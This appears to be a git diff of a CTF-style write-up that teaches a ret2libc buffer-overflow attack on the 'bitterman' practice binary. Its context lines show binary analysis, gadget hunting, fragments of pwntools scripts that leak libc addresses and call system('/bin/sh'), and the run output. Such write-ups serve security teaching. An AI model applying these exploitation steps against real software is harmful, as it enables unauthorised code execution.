@@ -23,7 +23,7 @@ Returning to libc is a method of exploiting a buffer overflow on a system that h
 
 Let's try `checksec bitterman` and see what protections are enabled.
 
-```
+```r
 Arch:     amd64-64-little 
 RELRO:    No RELRO
 Stack:    No canary found 
@@ -33,7 +33,7 @@ PIE:      No PIE
 
 **NX** is enabled that means we have a non executable stack, hence we need a ret2libc attack.Let's load up the binary into radare2 and start analysing.
 
-```
+```r
  0x0040077c      bfc9084000     mov edi, str.Please_enter_your_text: ; .//main.c:23 ; 0x4008c9 ; "> Please enter your text: " ; const char * s
 |           0x00400781      e89afdffff     call sym.imp.puts           ; int puts(const char *s)
 |           0x00400786      488b050b0520.  mov rax, qword [obj.stdout] ; loc.stdout ; [0x600c98:8]=0
@@ -44,7 +44,7 @@ PIE:      No PIE
 
 It uses `puts` that seems vulnerable? Can't say much without checking. So, let's use gdb-peda:-
 
-```
+```r
 gdb-peda$ r
 Starting program: /home/robin/ROP-Emporium/bitterman 
 > What's your name? 
@@ -59,7 +59,7 @@ Hi, robin
 
 Doing that, we get **Program received signal SIGSEGV, Segmentation fault.**, look like the stack overflowed i.e. a buffer overflow. So, let's continue analysing the stack and core that has been dumped.
 
-```
+```r
 [----------------------------------registers-----------------------------------]
 RAX: 0x0 
 RBX: 0x0 
@@ -124,7 +124,7 @@ First, as told earlier we need to get `put` address from the running process. Fi
 
 Let's get `puts` using `objdump -D bitterman | grep puts` :-
 
-```
+```r
 400520:	ff 25 2a 07 20 00    	jmpq   *0x20072a(%rip)        # 600c50 <puts@GLIBC_2.2.5>
 ```
 
@@ -140,7 +140,7 @@ So, we get the address of **PLT** and **GOT** `puts` i.e. `0x400520` and `0x600c
 ##### The Gadget
 
 For finding a gadget, I will use radare2's `/R < instruction >` command to find a `pop rdi; ret;` gadget.
-```
+```r
 [0x00400590]> /R pop rdi
   0x00400853                 5f  pop rdi
   0x00400854                 c3  ret
@@ -152,7 +152,7 @@ Let's make the exploit:-
 
 First off, we have `pop_rdi` gadget address and **PLT** and **GOT** `puts` address.
 
-```
+```py
 from pwn import * # importing fuctions 
 #context(terminal=['gnome-terminal','new-window']) Debug purpose
 #context.log_level = 'DEBUG' # Debug purpose
@@ -179,7 +179,7 @@ p.interactive() # keeps the shell interactive
 ```
 This script pretty much explains everything with comments. So, let's see what we get after running this:-
 
-```
+```r
 [+] Starting local process './bitterman': pid 3117
 [*] '/home/robin/ROP-Emporium/libc.so.6'
     Arch:     amd64-64-little
@@ -200,21 +200,21 @@ So, from the previous exploit we get the leaked address. Now we need to find the
 First off, we need `main` address because the leak address will be changed everytime so we need to get main address so we can use the leaked address to get the offset for current process.
 Using `objdump -D bitterman | grep main`, we will grab the address of the bitteman's `main`.
 
-```
+```r
 -snip--
 00000000004006ec <main>:
 --snip--
 ```
 Nice, we have the main address. Let's proceed further for crafting the exploit. 
 
->Warning: Before we proceeds, we need the `libc.so.6` of your machine. Copy it with `cp //lib/x86_64-linux-gnu/libc.so.6 .` , it willcopy the`libc.so.6` to the working directory.
+> Warning: Before we proceeds, we need the `libc.so.6` of your machine. Copy it with `cp //lib/x86_64-linux-gnu/libc.so.6 .` , it willcopy the`libc.so.6` to the working directory.
 
 Now, we will automate the finding of addresses of `put` and `system`  with pwntools but beforehand we need `/bin/sh` address as well. To find that, let's use strings `strings -a -t x libc.so.6 | grep /bin/sh` , we will get the address of `/bin/sh` from the `libc.so.6`.
 
 Let's make the exploit:-
 
 
-```
+```r
 #!/usr/bin/python
 
 from pwn import * # importing fuctions 
@@ -263,7 +263,7 @@ p.interactive()
 **This will spawn a shell and hence you learned how to do a ret2libc attack**.
 In a nutshell, we used the leak address to find the offset and hence using the gadget we overwrite the instruction pointer while calling the `system` and `/bin/sh` hence spawning a shell.
 
-```
+```r
 
 robin@oracle:~/ROP$ python exploit2.py
 [+] Starting local process './bitterman': pid 12562
